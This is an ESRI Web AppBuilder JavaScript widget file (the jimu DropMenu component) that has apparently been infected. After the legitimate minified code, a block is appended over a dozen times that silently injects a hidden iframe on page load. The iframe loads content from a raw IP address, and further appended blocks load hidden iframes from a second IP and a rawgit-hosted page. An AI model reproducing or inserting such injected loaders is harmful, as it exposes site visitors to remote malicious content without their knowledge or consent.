// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/Evented ../utils".split(" "),function(k,l,e,m,c,f,n,p){return k([l,n],{baseClass:"jimu-dropmenu",declaredClass:"jimu.dijit.DropMenu",constructor:function(){this.state="closed"},postCreate:function(){this.btnNode=c.create("div",{"class":"popup-menu-button"},this.domNode);this.own(f(this.btnNode,"click",e.hitch(this,this._onBtnClick)));this.box||(this.box=this.domNode.parentNode);this.own(f(this.box,
"click",e.hitch(this,function(){this.dropMenuNode&&this.closeDropMenu()})))},_onBtnClick:function(a){a.stopPropagation();this.dropMenuNode||this._createDropMenuNode();"closed"===this.state?this.openDropMenu():this.closeDropMenu()},_createDropMenuNode:function(){this.dropMenuNode=c.create("div",{"class":"drop-menu",style:{display:"none"}},this.domNode);this.items||(this.items=[]);m.forEach(this.items,function(a){var d;a.key&&"separator"===a.key?c.create("hr",{"class":"menu-item-identification menu-item-line",
itemId:a.key},this.dropMenuNode):a.key&&(d=c.create("div",{"class":"menu-item-identification menu-item",itemId:a.key,innerHTML:a.label},this.dropMenuNode),this.own(f(d,"click",e.hitch(this,function(c){this.selectItem(a,c)}))))},this)},_getDropMenuPosition:function(){var a=c.getContentBox(this.box),d=c.getMarginBox(this.domNode),e=c.getMarginBox(this.btnNode),g=c.getMarginBox(this.dropMenuNode),b={},h,f;b.l=d.l;b.t=d.t+e.h;b.t+g.h>a.h&&(f=d.t,h=a.h-d.t-e.h,h=Math.max(f,h),h===f&&(b.t=0-g.h));b.l+g.w>
a.w&&(g=d.l,a=a.w-d.l-e.w,h=Math.max(g,a),h===g&&(b.l="",b.r=0));b.left=b.l;b.top=b.t;b.right=b.r;return b},selectItem:function(a){this.closeDropMenu();this.emit("onMenuClick",a)},openDropMenu:function(){this.state="opened";c.setStyle(this.dropMenuNode,"display","");c.setStyle(this.dropMenuNode,p.getPositionStyle(this._getDropMenuPosition()));this.emit("onOpenMenu")},closeDropMenu:function(){this.state="closed";c.setStyle(this.dropMenuNode,"display","none");this.emit("onCloseMenu")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});